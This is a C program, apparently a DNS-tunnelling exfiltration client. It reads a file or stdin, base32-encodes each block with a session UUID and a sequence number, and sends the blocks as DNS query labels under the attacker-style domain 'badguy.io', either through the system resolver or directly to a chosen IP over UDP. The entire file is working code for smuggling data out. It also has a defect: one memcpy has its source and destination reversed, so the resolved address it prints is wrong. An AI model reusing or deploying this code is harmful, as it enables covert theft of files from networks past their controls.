#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <uuid/uuid.h>

#include "base32.h"
#include "debug.h"
#include "dns.h"
#include "payload.h"

void resolve_direct(unsigned char *name_buf, size_t name_size,
                    struct in_addr *ip);
void resolve(unsigned char *name_buf, size_t name_size);

int main(int argc, char **argv) {
  if (argc > 3) {
    fprintf(stderr, "Usage: %s [file] [ip]\n", argv[0]);
    exit(-1);
  }

  uuid_t session_id;
  uuid_generate_random(session_id);

  struct dns_payload payload;
  uuid_copy(payload.uuid, session_id);
  payload.sequence = 0;

  int direct = argc == 3;
  struct in_addr direct_ip;
  if (direct) {
    if (!inet_aton(argv[2], &direct_ip)) {
      perror("The 2nd parameter if specified should be an IPv4 address.");
      exit(EXIT_FAILURE);
    }
  }

  FILE *fin = argc == 1 ? stdin : fopen(argv[1], "r");
  if (!fin) {
    fprintf(stderr, "Unable to open file %s for reading.\n", argv[1]);
    exit(EXIT_FAILURE);
  }
  unsigned char base32_data_buf[256];
  while (!feof(fin)) {
    payload.length = fread(payload.data, 1, BLOCKSIZE, fin);
    if (payload.length != BLOCKSIZE && ferror(fin)) {
      fprintf(stderr, "Unable to read file\n");
      exit(-1);
    }

    size_t num_written =
        base32_encode((uint8_t *)&payload,
                      sizeof(struct dns_payload) - BLOCKSIZE + payload.length,
                      (uint8_t *)base32_data_buf, 256);
    base32_data_buf[num_written] = '\0';

    if (direct) {
      resolve_direct(base32_data_buf, num_written, &direct_ip);
    } else {
      resolve(base32_data_buf, num_written);
    }
    ++payload.sequence;
  }
  fclose(fin);
}

void resolve(unsigned char *name_prefix_buf, size_t name_prefix_size) {
  char name_buf[256];
  int num_labels = name_prefix_size / 60 + (name_prefix_size % 60 ? 1 : 0);
  char *name_buf_ptr = name_buf;
  for (int i = 0; i < num_labels; ++i) {
    int start = i * 60;
    size_t count =
        (start + 60 <= name_prefix_size) ? 60 : name_prefix_size - start;
    memcpy(name_buf_ptr, name_prefix_buf + start, count);
    *(name_buf_ptr + count) = '.';
    name_buf_ptr += count + 1;
  }
  memcpy(name_buf_ptr, "badguy.io\0", 10);
  struct hostent *host = gethostbyname(name_buf);
  if (host) {
    struct in_addr address;
    memcpy(*host->h_addr_list++, &address, sizeof(struct in_addr));
    printf("resolve %s to %s\n", name_buf, inet_ntoa(address));
  } else {
    fprintf(stderr, "Unable to resolve %s\n", name_buf);
    exit(EXIT_FAILURE);
  }
}

void resolve_direct(unsigned char *name_prefix_buf, size_t name_prefix_size,
                    struct in_addr *ip) {
  unsigned char dns_buf[1024];
  memset(dns_buf, 0, 1024);
  struct dns_header *header = (struct dns_header *)dns_buf;
  header->id = htons(1337);
  header->rd = 1;
  header->qdcount = htons(1);
  unsigned char *dns_buf_ptr = dns_buf + sizeof(struct dns_header);
  int num_labels = name_prefix_size / 60 + (name_prefix_size % 60 ? 1 : 0);
  for (int i = 0; i < num_labels; ++i) {
    int start = i * 60;
    size_t count =
        (start + 60 <= name_prefix_size) ? 60 : name_prefix_size - start;
    *dns_buf_ptr = (unsigned char)count;
    memcpy(dns_buf_ptr + 1, name_prefix_buf + start, count);
    dns_buf_ptr += count + 1;
  }
  *dns_buf_ptr = (unsigned char)6;
  memcpy(dns_buf_ptr + 1, "badguy", 6);
  *(dns_buf_ptr + 7) = (unsigned char)2;
  memcpy(dns_buf_ptr + 8, "io", 2);
  *(dns_buf_ptr + 10) = (unsigned char)0;
  *((uint16_t *)(dns_buf_ptr + 11)) = htons(1);
  *((uint16_t *)(dns_buf_ptr + 13)) = htons(1);
  size_t buf_size = dns_buf_ptr + 15 - dns_buf;
  printf("Sent:\n");
  print_buffer(dns_buf, buf_size);

  int sockfd;
  if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
    perror("socket creation failed");
    exit(EXIT_FAILURE);
  }

  struct sockaddr_in sockaddr;
  sockaddr.sin_addr = *ip;
  sockaddr.sin_family = AF_INET;
  sockaddr.sin_port = htons(DNS_PORT);
  if (sendto(sockfd, dns_buf, buf_size, MSG_CONFIRM,
             (struct sockaddr *)&sockaddr, sizeof(struct sockaddr_in)) == -1) {
    perror("sendto failed");
    exit(EXIT_FAILURE);
  }
  unsigned char response[1024];
  int num_received;
  socklen_t socklen = sizeof(struct sockaddr_in);
  if ((num_received = recvfrom(sockfd, response, sizeof(response), MSG_WAITALL,
                               (struct sockaddr *)&sockaddr, &socklen)) == -1) {
    perror("receive failed");
    exit(EXIT_FAILURE);
  }
  printf("Recevied:\n");
  print_buffer(response, num_received);
}
